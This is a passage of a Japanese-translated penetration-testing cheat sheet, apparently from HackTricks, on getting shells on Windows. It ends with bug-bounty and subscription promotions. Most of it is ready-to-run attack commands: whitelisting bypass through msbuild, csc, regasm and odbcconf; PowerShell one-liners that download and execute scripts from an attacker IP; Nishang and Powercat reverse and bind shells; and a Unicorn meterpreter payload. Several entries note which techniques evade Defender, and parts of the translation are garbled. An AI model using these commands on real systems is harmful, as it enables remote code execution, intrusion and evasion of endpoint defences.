この技術を使用すると、アプリケーションホワイトリストとPowershell.exeの制限を回避できます。PSシェルが表示されるため、次のコードをダウンロードして実行してください: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**検出されない**

## **CSC**

被害者のマシンでC#コードをコンパイルします。
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
ここから基本的なC#リバースシェルをダウンロードできます：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**検出されません**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
ネットワークコールを実行するプロセス：**svchost.exe**\
ディスク上に書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**

**試していません**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
ネットワークコールを実行するプロセス：**svchost.exe**\
ディスク上に書き込まれるペイロード：**WebDAVクライアントのローカルキャッシュ**

**試していません**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershellシェル

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**Shells**フォルダには、さまざまなシェルがあります。**Invoke-_PowerShellTcp.ps1_**をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加してください：
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
被害者の端末でスクリプトを実行するために、ウェブサーバーでスクリプトを提供し始めます。
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defenderはそれを悪意のあるコードとして検出しません（まだ、2019/04/03）。

**TODO: 他のnishangシェルをチェックする**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

ダウンロードし、ウェブサーバーを起動し、リスナーを起動し、被害者の端末で実行します。
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defenderはそれを悪意のあるコードとして検出しません（まだ、2019年3月4日）。

**powercatが提供する他のオプション:**

バインドシェル、リバースシェル（TCP、UDP、DNS）、ポートリダイレクト、アップロード/ダウンロード、ペイロードの生成、ファイルの提供...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

パワーシェルランチャーを作成し、ファイルに保存してダウンロードして実行します。
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**悪意のあるコードとして検出されました**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

ユニコーンを使用して、メタスプロイトのバックドアのPowerShellバージョンを作成します。
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
作成したリソースを使用して、msfconsoleを起動します:

```bash
msfconsole -r <resource_file>
```

`<resource_file>`には、作成したリソースファイルのパスを指定します。
```
msfconsole -r unicorn.rc
```
以下は、ハッキング手法に関する本の内容です。以下の内容は、generic-methodologies-and-resources/shells/windows.md ファイルからのものです。

```markdown
Start a web server serving the _powershell\_attack.txt_ file and execute in the victim:
```

被害者のコンピュータで、_powershell\_attack.txt_ ファイルを提供するウェブサーバーを起動し、次のコマンドを実行してください。
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**悪意のあるコードが検出されました**

## 詳細

[PS>Attack](https://github.com/jaredhaight/PSAttack) は、いくつかの攻撃的なPSモジュールが事前にロードされたPSコンソールです（暗号化済み）\
[WinPWN](https://github.com/SecureThisShit/WinPwn) は、いくつかの攻撃的なPSモジュールとプロキシ検出が組み込まれたPSコンソールです（IEX）

## 参考文献

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報奨金の場所です。**

**遅延なしで報酬を受け取る**\
HackenProofの報奨金は、顧客が報奨金予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長期におけるweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**してみませんか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
